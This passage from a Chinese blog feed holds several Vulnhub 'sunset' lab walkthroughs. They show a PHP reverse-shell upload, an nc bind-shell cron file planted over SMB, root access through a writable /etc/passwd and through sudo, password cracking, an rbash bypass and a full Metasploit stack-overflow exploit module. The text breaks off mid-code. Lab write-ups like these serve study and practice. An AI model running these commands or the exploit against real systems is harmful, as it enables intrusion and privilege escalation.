<h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>使用<code>dirb</code> 工具扫描网站目录</p>
<p><img src="https://i.loli.net/2020/09/15/PBzlk1anFNH2Vi5.png" alt="image-20200915002033766"></p>
<p>找到了这个目录，访问之后是文件上传</p>
<p>由于没有检查文件后缀名，使用<code>burpsuite</code>抓包绕过检测，成功上传文件，一个<code>php_reverse_shell</code></p>
<p><img src="https://i.loli.net/2020/09/15/lxBjwWnz5ZLuSky.png" alt="image-20200915002228601"></p>
<p>通过目录扫描的结果可以得到文件上传的路径<code>http://192.168.6.129/gallery/original/ </code></p>
<p>访问之后得到shell</p>
<p><img src="https://i.loli.net/2020/09/15/ktvmBYsoruIbJyX.png" alt="image-20200915002345152"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找能提权的东西，找<code>setuid</code>权限的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/var/www/html/gallery/maxImageUpload.zip</span><br><span class="line">/var/www/html/gallery/readme.txt</span><br><span class="line">/var/www/html/gallery/style/images/ok.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_bg.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_right.gif</span><br><span class="line">/var/www/html/gallery/style/images/button.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_left.gif</span><br><span class="line">/var/www/html/gallery/style/images/nok.gif</span><br><span class="line">/var/www/html/gallery/style/style.css</span><br><span class="line">/var/www/html/gallery/maxImageUpload.class.php</span><br></pre></td></tr></table></figure>

<p>看到php文件，以为是用php提权，结果发现并不是</p>
<p>之前有过使用<code>exim4</code>提权的经验，所以尝试<code>exim</code>提权，结果也不是</p>
<p>无奈偷偷看一眼参考答案，发现<code>/etc/passwd</code>居然可写。。。</p>
<p><img src="https://i.loli.net/2020/09/15/RstrZGA693aq8mK.png" alt="image-20200915002707980"></p>
<p>使用<code>openssl passwd -1 -salt stderr 1234</code>生成一个密码，写入一个账户即可</p>
<p><img src="https://i.loli.net/2020/09/15/SN6MEGUA1qeZwIK.png" alt="image-20200915002803301"></p>
<p>然后切换用户，得到<code>root</code>权限</p>
<p><img src="https://i.loli.net/2020/09/15/s7QxtFDOg3TJHc8.png" alt="image-20200915002856988"></p>
<p>这次的图不是很好看（</p>
<p><img src="https://i.loli.net/2020/09/15/4Dy5HoJeqx6zXUV.png" alt="image-20200915002917639"></p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>file-upload</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:dawn靶机</title>
    <url>//sunset-dawn.html</url>
    <content><![CDATA[<p>vulnhub里的 sunset:dawn 靶机</p>
<p>简单难度</p>
<a id="more"></a>



<h1 id="Sunset-dawn"><a href="#Sunset-dawn" class="headerlink" title="Sunset:dawn"></a>Sunset:dawn</h1><p>(主机发现和端口扫描略过了)</p>
<img src="sunset:dawn/image-20200711163441204.png" alt="image-20200711163441204" style="zoom:33%;" />

<p>结果就是开了这些端口</p>
<img src="sunset:dawn/image-20200711164203753.png" alt="image-20200711164203753" style="zoom:25%;" />



<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>访问之后</p>
<img src="sunset:dawn/image-20200711163515781.png" alt="image-20200711163515781" style="zoom:33%;" />

<p>嗯嗯嗯？？甚至没有<code>robots.txt</code></p>
<p>所以用<code>dirbuster</code>爆破一下目录</p>
<img src="sunset:dawn/image-20200711163816987.png" alt="image-20200711163816987" style="zoom:33%;" />

<p>看到了<code>/logs</code>目录，打开看看</p>
<img src="sunset:dawn/image-20200711163856125.png" alt="image-20200711163856125" style="zoom:33%;" />

<p>只有最后一个可以打开，</p>
<img src="sunset:dawn/image-20200711163932597.png" alt="image-20200711163932597" style="zoom:33%;" />

<p>看着像是每分钟执行一次<code>/home/dawn/ITDEPT</code>目录下的<code>product-control</code> <code>web-control</code>文件</p>
<p>所以想的是上传文件，看到了端口扫描时候的smb</p>
<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>使用<code>smbclient</code>工具扫描一下目录</p>
<img src="sunset:dawn/image-20200711164258852.png" alt="image-20200711164258852" style="zoom:33%;" />

<p><code>ITDEPT</code>还真的有</p>
<p>创建文件<code>echo &quot;nc -e /bin/bash -vlp 8848 &amp;&quot; &gt; web-control</code>，上传文件</p>
<img src="sunset:dawn/image-20200711164558000.png" alt="image-20200711164558000" style="zoom:33%;" />

<p>连接上去，得到一个shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><img src="sunset:dawn/image-20200711164732972.png" alt="image-20200711164732972" style="zoom:33%;" />

<p>来个好点的shell，<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot;</code></p>
<img src="sunset:dawn/image-20200711164837491.png" alt="image-20200711164837491" style="zoom:33%;" />

<p>找一下提权的，<code>sudo -l</code></p>
<img src="sunset:dawn/image-20200711164928573.png" alt="image-20200711164928573" style="zoom:33%;" />



<p>另一个端口的是<code>www-data</code></p>
<img src="sunset:dawn/image-20200711165046978.png" alt="image-20200711165046978" style="zoom:33%;" />

<p>而他可以直接运行sudo</p>
<p>那就直接<code>sudo -u root /usr/bin/sudo /bin/bash</code></p>
<img src="sunset:dawn/image-20200711165130024.png" alt="image-20200711165130024" style="zoom:33%;" />



<blockquote>
<p>  flag 文件里说有别的getshell的方法，并且有4种提权的方法</p>
</blockquote>
]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>smb</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:dawn2靶机</title>
    <url>//sunset-dawn2.html</url>
    <content><![CDATA[<p>vulnhub里的 sunset:dawn2 靶机</p>
<p>简单/中等难度</p>
<a id="more"></a>



<h1 id="sunset-dawn2"><a href="#sunset-dawn2" class="headerlink" title="sunset:dawn2"></a>sunset:dawn2</h1><p><font color='red'>回到了做pwn的时候呢</font></p>
<p>省略掉主机发现和端口扫描</p>
<img src="sunset:dawn2/image-20200713090452736.png" alt="image-20200713090452736" style="zoom:33%;" />

<p>其实还有一个端口，不太稳定</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>使用<code>dirbuster</code>扫描目录</p>
<p>得到一个<code>save.zip</code>，解压之后是一个exe文件和一个<code>README</code></p>
<img src="sunset:dawn2/image-20200713090633493.png" alt="image-20200713090633493" style="zoom:33%;" />

<p>应该是要日这个exe的意思</p>
<h2 id="dawn-exe"><a href="#dawn-exe" class="headerlink" title="dawn.exe"></a>dawn.exe</h2><p>使用ida 反编译这个程序</p>
<p><code>main</code>函数运行了<code>main_0</code></p>
<p>是一个<code>socket</code>的程序</p>
<h3 id="main-0"><a href="#main-0" class="headerlink" title="main_0"></a>main_0</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// al</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> <span class="title">WSAData</span>;</span> <span class="comment">// [esp+0h] [ebp-1C4h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">name</span>;</span> <span class="comment">// [esp+190h] [ebp-34h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+1A0h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> addrlen; <span class="comment">// [esp+1B0h] [ebp-14h]</span></span><br><span class="line">  SOCKET s; <span class="comment">// [esp+1B4h] [ebp-10h]</span></span><br><span class="line">  SOCKET v7; <span class="comment">// [esp+1B8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *buf; <span class="comment">// [esp+1BCh] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [esp+1C0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf = (<span class="keyword">char</span> *)j__malloc(<span class="number">0x401</span>u);</span><br><span class="line">  WSAStartup(<span class="number">0x202</span>u, &amp;WSAData);</span><br><span class="line">  s = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  sub_34573918(aTheServerHasBe, WSAData.wVersion);</span><br><span class="line">  name.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_DWORD *)&amp;name.sa_data[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_WORD *)name.sa_data = htons(<span class="number">0x7C1</span>u);</span><br><span class="line">  bind(s, &amp;name, <span class="number">16</span>);</span><br><span class="line">  listen(s, <span class="number">1</span>);</span><br><span class="line">  j__puts(aTheServerIsCur);</span><br><span class="line">  addrlen = <span class="number">16</span>;</span><br><span class="line">  v7 = accept(s, &amp;addr, &amp;addrlen);</span><br><span class="line">  ntohs(*(u_short *)addr.sa_data);</span><br><span class="line">  inet_ntoa(*(struct in_addr *)&amp;addr.sa_data[<span class="number">2</span>]);</span><br><span class="line">  sub_34573918(aAConnectionHas, v7);</span><br><span class="line">  <span class="keyword">for</span> ( len = <span class="number">1</span>; len; send(v7, buf, len, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    len = recv(v7, buf, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( len == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      closesocket(v7);</span><br><span class="line">      j__exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[len] = <span class="number">32</span>;</span><br><span class="line">    sub_3457114F(buf);</span><br><span class="line">    ntohs(*(u_short *)addr.sa_data);</span><br><span class="line">    v0 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)inet_ntoa(*(struct in_addr *)&amp;addr.sa_data[<span class="number">2</span>]);</span><br><span class="line">    sub_34573918(&amp;unk_345CB0A4, v0);</span><br><span class="line">  &#125;</span><br><span class="line">  closesocket(v7);</span><br><span class="line">  WSACleanup();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="sub-3457114F"><a href="#sub-3457114F" class="headerlink" title="sub_3457114F"></a>sub_3457114F</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_3457114F</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_34576730(a1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_34576730</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+0h] [ebp-10Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> j__strcpy(&amp;v2, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然，存在栈溢出。junk的大小是<code>0x10C + 0x4(ebp) = 0x110</code></p>
<h3 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h3><p>使用msf 的一个工具<code>msfbinscan</code></p>
<img src="sunset:dawn2/image-20200713091419492.png" alt="image-20200713091419492" style="zoom:33%;" />

<p>选用那个<code>0x34581777</code></p>
<p>套用windows栈溢出的模板</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">require <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Metasploit3</span> &lt; <span class="title">Msf</span>:</span>:Exploit::Remote</span><br><span class="line">  Rank = NormalRanking</span><br><span class="line">  include Msf::Exploit::Remote::Tcp</span><br><span class="line">  include Msf::Exploit::Powershell</span><br><span class="line">  include Msf::Exploit::EXE</span><br><span class="line">  include Msf::Exploit::WbemExec</span><br><span class="line">  include Msf::Auxiliary::Report</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span></span><br><span class="line"><span class="function">  <span class="title">super</span>(<span class="params">update_info(<span class="params">info,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;Stack Based Buffer Overflow Example&#x27;</span>,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    <span class="string">&#x27;Description&#x27;</span> =&gt; %q&#123;</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      Stack Based Overflow Example Application Exploitation Module</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    &#125;,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;Windows&#x27;</span>,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">    <span class="string">&#x27;Author&#x27;</span> =&gt; </span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      [</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        <span class="string">&#x27;stdout&#x27;</span></span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      ],</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      </span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">     <span class="string">&#x27;Payload&#x27;</span> =&gt;</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      &#123;</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        <span class="string">&#x27;space&#x27;</span> =&gt; <span class="number">1000</span>,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        <span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&quot;\x20\x0a\x0d\x00\xff&quot;</span></span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      &#125;,</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">     <span class="string">&#x27;Targets&#x27;</span> =&gt;</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      [</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">        [<span class="string">&#x27;linux&#x27;</span>, &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x34581777</span>, <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">0x110</span>&#125;]</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">         <span class="comment">#[&#x27;linux&#x27;, &#123;&#x27;Ret&#x27; =&gt; 0x52501510, &#x27;Offset&#x27; =&gt; 13&#125;]</span></span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">      ],</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">     <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2019-01-15&#x27;</span></span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="params">  </span>)</span>)</span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">  <span class="title">register_options</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  [</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">#Opt::RPORT(1435)</span></span></span></span><br><span class="line"><span class="function"><span class="params">      Opt::RPORT(<span class="params"><span class="number">1985</span></span>)</span></span></span><br><span class="line"><span class="function"><span class="params">  ],self.<span class="keyword">class</span></span>)</span></span><br><span class="line"><span class="function">  <span class="title">end</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">  <span class="title">def</span> <span class="title">exploit</span></span></span><br><span class="line"><span class="function">    <span class="title">connect</span></span></span><br><span class="line">    buf = make_nops(target[&#x27;Offset&#x27;])</span><br><span class="line">    <span class="comment">#buf = &quot;\x90&quot; * 13</span></span><br><span class="line">    buf = buf + [target[<span class="string">&#x27;Ret&#x27;</span>]].pack(<span class="string">&#x27;V&#x27;</span>) + make_nops(<span class="number">20</span>) + payload.encoded + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    sock.put(buf)</span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">   end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>



<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><img src="sunset:dawn2/image-20200713092422650.png" alt="image-20200713092422650" style="zoom:33%;" />

<p>pwn掉了<code>dawn.exe</code>，但是打不开shell（原系统是Linux吧）</p>
<img src="sunset:dawn2/image-20200713210708410.png" alt="image-20200713210708410" style="zoom:33%;" />



<p>有一个<code>dawn-BETA.exe</code>(并且是root用户的)，猜测另一个端口运行的就是这个，使用<code>download</code> 命令下载下来</p>
<img src="sunset:dawn2/image-20200713210727525.png" alt="image-20200713210727525" style="zoom:33%;" />

<p>发现和<code>dawn.exe</code>差不多，照葫芦画瓢就可以pwn掉</p>
<p>得到root权限</p>
<img src="sunset:dawn2/image-20200713211748904.png" alt="image-20200713211748904" style="zoom:33%;" />



]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>stack_overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub sunset:decoy靶机</title>
    <url>//sunset-decoy.html</url>
    <content><![CDATA[<p>vulnhub里的 sunset-decoy 靶机</p>
<p>简单难度</p>
<a id="more"></a>



<h1 id="Sunset-decoy"><a href="#Sunset-decoy" class="headerlink" title="Sunset:decoy"></a>Sunset:decoy</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for decoy (192.168.2.165)</span><br><span class="line">Host is up (0.00078s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure>



<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nmap -Pn 192.168.2.165 -A -p0-65535</span><br><span class="line"></span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)</span><br><span class="line">|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)</span><br><span class="line">|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| 3.0K  2020-07-07 16:36  save.zip</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Index of /</span><br></pre></td></tr></table></figure>

<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>存在一个<code>save.zip</code>，直接下载了</p>
<img src="sunset:decoy/image-20200711000206657.png" alt="image-20200711000206657" style="zoom:50%;" />

<p>需要密码</p>
<h2 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h2><p>使用<code>fcrackzip</code>爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Downloads# fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt ./save.zip </span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == manuel</span><br></pre></td></tr></table></figure>

<p>得到了密码<code>manuel</code>，解压之后得到</p>
<img src="sunset:decoy/image-20200711000426367.png" alt="image-20200711000426367" style="zoom:50%;" />

<p>直接查看<code>passwd</code>和<code>shadow</code>，发现<code>shadow</code>里面有一个<code>hash</code></p>
<img src="sunset:decoy/image-20200711000513705.png" alt="image-20200711000513705" style="zoom:50%;" />

<p>使用<code>john</code>工具爆破</p>
<img src="sunset:decoy/image-20200711000626023.png" alt="image-20200711000626023" style="zoom:50%;" />

<h2 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h2><p>得到密码之后<code>ssh</code>连接上去，发现是一个<code>rbash</code>（图中的<code>pspy64</code>是我后来上传上去的）</p>
<img src="sunset:decoy/image-20200711000804132.png" alt="image-20200711000804132" style="zoom:50%;" />

<p>我找了好多绕过rbash的方法都失败了，偷偷翻了参考答案</p>
<p>在ssh的时候使用<code>-t &quot;bash --noprofile&quot;</code>即可，原理写在<a href="#../%E5%B0%8F%E7%9F%A5%E8%AF%86">小知识</a>里面</p>
<p>没有完全绕过，但是可以用<code>/</code> 了</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>本目录下面提供了一个<code>honeypot.decoy</code>文件，下载下来反编译看了看</p>
<p><code>main</code>函数运行了<code>intro</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">intro</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  lines();</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v0 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">         &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">         <span class="string">&quot;Welcome to the Honey Pot administration manager (HPAM). Please select an option.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;1 Date.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;2 Calendar.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;3 Shutdown.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;4 Reboot.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;5 Launch an AV Scan.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;6 Check /etc/passwd.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v7 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;7 Leave a note.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;8 Check all services status.&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Option selected:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v11);</span><br><span class="line">  <span 